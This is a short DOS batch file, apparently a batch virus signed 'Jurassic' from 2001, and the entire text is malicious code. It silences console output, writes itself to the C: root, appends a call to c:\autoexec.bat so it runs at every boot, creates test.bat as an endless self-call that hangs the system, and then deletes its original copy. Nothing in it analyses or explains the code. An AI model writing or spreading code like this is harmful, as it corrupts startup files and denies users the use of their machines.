@echo Copyright (c) 2001 by Jurassic
@ctty nul
copy %0 c:\start.bat
echo c:\test.bat>c:\start.bat
echo start.bat>>c:\autoexec.bat
copy %0 c:\test.bat
echo @test.bat>c:\test.bat
erase %0